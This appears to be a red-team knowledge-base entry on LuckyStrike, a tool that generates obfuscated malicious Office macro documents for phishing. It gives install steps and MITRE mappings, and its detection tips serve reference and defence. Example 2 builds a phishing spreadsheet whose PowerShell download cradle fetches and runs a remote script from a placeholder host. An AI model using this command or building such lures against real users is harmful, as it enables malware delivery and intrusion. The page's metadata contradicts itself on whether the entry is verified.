---
id: beeb397a-bd2b-4e73-bc07-52752903cf47
type: tool
verified: true
created_at: '2019-08-28T21:17:40.754615+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - macro-generation
  - office-attack
  - phishing
  - powershell
url: 'https://github.com/Shellntel/LuckyStrike'
commands:
  - '[[commands/luckystrike-generate-basic-macro]]'
  - '[[commands/luckystrike-generate-obfuscated-macro]]'
validated: true
---

# LuckyStrike

**Status**: Unverified

## Overview

LuckyStrike is a PowerShell-based utility for creating malicious Microsoft Office macro documents. It is designed for penetration testing and educational purposes, allowing security professionals to generate VBA macros that deliver payloads via phishing attachments.

## Description

LuckyStrike automates the creation of macro-enabled Office files (.docm, .xlsm, .pptm) with embedded payloads. It supports standard macros, DDE (Dynamic Data Exchange), and obfuscation to bypass endpoint detection. Commonly used in red team engagements to simulate social engineering attacks where users enable macros to execute code, leading to initial access or execution of further payloads like PowerShell download cradles or reverse shells.

## Features

- Feature 1: Generation of various macro types including VBA and DDE for compatibility with older Office versions
- Feature 2: Payload embedding for PowerShell, cmd.exe, or custom scripts
- Feature 3: Built-in obfuscation to rename variables and alter code structure, reducing static detection signatures
- Feature 4: Support for multiple Office applications (Word, Excel, PowerPoint)
- Feature 5: Template-based macro creation for rapid prototyping of attacks

## Installation

### Requirements

- PowerShell 3.0 or later
- Git for cloning the repository
- Microsoft Office (for testing generated documents; not required for generation)

### Install Commands

```powershell
# Clone from GitHub
 git clone https://github.com/Shellntel/LuckyStrike.git

# Change directory
 cd LuckyStrike

# Import the module (run in elevated PowerShell if needed)
 Import-Module .\LuckyStrike.psm1

# Verify installation
 Get-Command Invoke-LuckyStrike
```

On Ubuntu/Kali (with PowerShell Core):

```bash
# Install PowerShell if not present
 sudo apt update && sudo apt install -y powershell

# Clone and import (pwsh instead of powershell)
 git clone https://github.com/Shellntel/LuckyStrike.git
 cd LuckyStrike
 pwsh -c "Import-Module .\LuckyStrike.psm1"
```

Note: Full Office suite is Windows-centric; use Wine or VMs for Linux testing.

## Basic Usage

```powershell
Get-Help Invoke-LuckyStrike -Full
```

### Common Options

| Option | Description |
|--------|-------------|
| -MacroType | Specifies macro style (e.g., Macro, DDE, HTA) |
| -Payload | Command string to execute upon macro activation |
| -OutputPath | File path for the generated Office document |
| -Obfuscate | Applies randomization to VBA code for evasion |
| -h, --help | Displays help and available parameters |

## Examples

### Example 1: Basic Usage

Generate a simple macro document that launches calculator:

```powershell
Invoke-LuckyStrike -MacroType Macro -Payload "calc.exe" -OutputPath ./test.docm
```

### Example 2: Advanced Usage

Create an obfuscated document with a PowerShell payload:

```powershell
Invoke-LuckyStrike -MacroType Macro -Payload "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/evil.ps1')\"" -OutputPath ./phish.xlsm -Obfuscate
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[T1566.001]] Phishing: Spearphishing Attachment
- [[Malicious File]] User Execution: Malicious File
- [[PowerShell]] Command and Scripting Interpreter: PowerShell

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor PowerShell module imports for LuckyStrike.psm1 in event logs (Event ID 4104)
- Detection method 2: Scan Office files for suspicious VBA macros using tools like OLETools (olevba.py)
- Detection method 3: Endpoint protection rules for Office processes spawning PowerShell or network connections
- Detection method 4: YARA rules matching obfuscated VBA patterns or known LuckyStrike templates

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Metasploit]] (for generating payloads to embed)
- [[tools/OfficeMalScanner]] (for analyzing generated macros)

## References

- Official GitHub: https://github.com/Shellntel/LuckyStrike
- Author: Shellntel (Twitter: @shellntel)
- Related Blog: https://posts.shellntel.com/luckystrike

*Last updated: 2023-10-01T00:00:00Z*
